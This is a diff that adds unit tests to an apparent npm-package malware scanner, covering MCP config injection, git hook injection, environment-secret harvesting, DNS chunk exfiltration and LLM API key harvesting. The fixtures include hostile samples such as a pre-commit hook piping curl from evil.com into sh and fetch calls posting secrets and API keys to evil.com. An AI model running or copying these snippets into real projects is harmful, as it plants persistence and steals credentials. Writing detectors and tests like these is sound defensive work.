@@ -718,6 +718,172 @@ require(tmpFile);
       assert(!t, 'Should NOT trigger write_execute_delete without file deletion');
     } finally { cleanupTemp(tmp); }
   });
+
+  // ============================================
+  // SANDWORM_MODE P2: R5 — MCP Config Injection (AST-027)
+  // ============================================
+
+  await asyncTest('AST: Detects MCP config injection to .cursor/mcp.json with mcpServers', async () => {
+    const code = `
+const fs = require('fs');
+const path = require('path');
+const config = JSON.stringify({ mcpServers: { evil: { command: "node", args: ["server.js"] } } });
+fs.writeFileSync(path.join(os.homedir(), '.cursor', 'mcp.json'), config);
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'mcp_config_injection');
+      assert(t, 'Should detect MCP config injection to .cursor/mcp.json');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Write to .vscode/ without MCP content → no mcp_config_injection', async () => {
+    const code = `
+const fs = require('fs');
+fs.writeFileSync('.vscode/settings.json', '{"editor.fontSize": 14}');
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'mcp_config_injection');
+      assert(!t, 'Should NOT detect mcp_config_injection for plain vscode settings');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ============================================
+  // SANDWORM_MODE P2: R6 — Git Hooks Injection (AST-028)
+  // ============================================
+
+  await asyncTest('AST: Detects git hooks pre-commit write', async () => {
+    const code = `
+const fs = require('fs');
+fs.writeFileSync('.git/hooks/pre-commit', '#!/bin/sh\\ncurl http://evil.com | sh');
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'git_hooks_injection');
+      assert(t, 'Should detect git hook injection to .git/hooks/pre-commit');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Detects git config init.templateDir', async () => {
+    const code = `
+const { execSync } = require('child_process');
+execSync('git config --global init.templateDir /tmp/evil-templates');
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'git_hooks_injection');
+      assert(t, 'Should detect git config init.templateDir injection');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ============================================
+  // SANDWORM_MODE P2: R7 — Env Harvesting Dynamic (AST-029)
+  // ============================================
+
+  await asyncTest('AST: Detects Object.entries(process.env) + TOKEN/SECRET patterns', async () => {
+    const code = `
+const entries = Object.entries(process.env);
+const secrets = entries.filter(([k]) => k.includes('TOKEN') || k.includes('SECRET'));
+fetch('http://evil.com', { body: JSON.stringify(secrets) });
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_harvesting_dynamic');
+      assert(t, 'Should detect env harvesting with sensitive patterns');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Object.keys(process.env) without sensitive patterns → no env_harvesting_dynamic', async () => {
+    const code = `
+const keys = Object.keys(process.env);
+console.log('Found', keys.length, 'env vars');
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_harvesting_dynamic');
+      assert(!t, 'Should NOT detect env harvesting without sensitive patterns');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ============================================
+  // SANDWORM_MODE P2: R8 — DNS Chunk Exfiltration (AST-030)
+  // ============================================
+
+  await asyncTest('AST: Detects DNS resolve4 with base64 encoding (exfiltration)', async () => {
+    const code = `
+const dns = require('dns');
+const data = Buffer.from(secret).toString('base64');
+for (let i = 0; i < chunks.length; i++) {
+  dns.resolve4(chunks[i] + '.evil.com', () => {});
+}
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dns_chunk_exfiltration');
+      assert(t, 'Should detect DNS exfiltration with base64 encoding');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Simple dns.resolve4 without base64 → no dns_chunk_exfiltration', async () => {
+    const code = `
+const dns = require('dns');
+dns.resolve4('example.com', (err, addresses) => {
+  console.log(addresses);
+});
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dns_chunk_exfiltration');
+      assert(!t, 'Should NOT detect dns_chunk_exfiltration for simple DNS lookup');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ============================================
+  // SANDWORM_MODE P2: R9 — LLM API Key Harvesting (AST-031)
+  // ============================================
+
+  await asyncTest('AST: Detects 4 LLM API keys in same file → MEDIUM harvesting', async () => {
+    const code = `
+const openai = process.env.OPENAI_API_KEY;
+const anthropic = process.env.ANTHROPIC_API_KEY;
+const google = process.env.GOOGLE_API_KEY;
+const groq = process.env.GROQ_API_KEY;
+fetch('http://evil.com', { body: JSON.stringify({ openai, anthropic, google, groq }) });
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'llm_api_key_harvesting');
+      assert(t, 'Should detect LLM API key harvesting with 4 providers');
+      assert(t.severity === 'MEDIUM', 'Should be MEDIUM severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Single OPENAI_API_KEY → no llm_api_key_harvesting', async () => {
+    const code = `
+const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'llm_api_key_harvesting');
+      assert(!t, 'Should NOT detect harvesting for single LLM API key (legitimate usage)');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
